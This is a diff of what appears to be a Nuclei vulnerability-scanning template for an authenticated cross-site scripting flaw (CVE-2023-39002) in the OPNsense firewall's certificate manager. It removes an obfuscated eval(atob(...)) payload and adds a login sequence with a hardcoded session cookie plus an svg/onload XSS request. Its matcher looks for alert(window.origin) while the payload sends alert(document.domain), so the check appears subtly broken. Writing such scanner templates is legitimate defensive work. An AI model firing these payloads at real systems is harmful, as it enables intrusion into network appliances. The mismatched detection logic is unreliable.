@@ -1,19 +1,69 @@
-id: opnsense-xss
+id: CVE-2023-39002
+
 info:
-  name: OPNsense - Cross Site Scripting
+  name: OPNsense - Cross-Site Scripting/RCE
   author: Herry
   severity: medium
+  description: | 
+    A cross-site scripting (XSS) vulnerability in the act parameter of system_certmanager.php in OPNsense before 23.7 allows attackers to execute arbitrary web scripts or HTML via a crafted payload.
   reference:
     - https://logicaltrust.net/blog/2023/08/opnsense.html
-  tags: opnsense,xss
+    - https://nvd.nist.gov/vuln/detail/CVE-2023-39002
+  classification:
+    cve-id: CVE-2023-39002
+  metadata:
+    max-request: 3
+    shodan-query: title:"OPNsense"
+  tags: cve,cve2023,opnsense,xss,authenticated,rce
 
 http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/system_certmanager.php?act=%22%3E%3Csvg/onload=eval(atob(%27bGV0IHJlcXVlc3REYXRh[...]HsKCQl9KQoJfSkKfSwgMTAwMCk=%27))%3E&id=0"
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
 
+      - |
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: PHPSESSID=9dfedabe761929052170ce6821379157; cookie_test=544eaf44c3c92e506d5a218546cc5723
+        Content-Type: application/x-www-form-urlencoded
+
+        {{para}}={{value}}&usernamefld={{username}}&passwordfld={{password}}&login=1
+
+      - |
+        GET /system_certmanager.php?act=%22%3E%3Csvg/onload=alert(document.domain)%3E&id=0 HTTP/1.1
+        Host: {{Hostname}}
+
+    cookie-reuse: true
+    matchers-condition: and
     matchers:
       - type: word
-        part: body
+        part: body_3
         words:
-          - 'id="action" value=""><svg/onload=alert(window.origin)>"/>'
+          - 'value=""><svg/onload=alert(window.origin)> "/>'
+
+      - type: word
+        part: header_3
+        words:
+          - "text/html"
+
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: regex
+        name: para
+        part: body
+        group: 1
+        regex:
+          - 'type="hidden" name="([a-zA-Z0-9]+)" value="([A-Z0-9a-z]+)" autocomplete="'
+        internal: true
+
+      - type: regex
+        name: value
+        part: body
+        group: 2
+        regex:
+          - 'type="hidden" name="([a-zA-Z0-9]+)" value="([A-Z0-9a-z]+)" autocomplete="'
+        internal: true
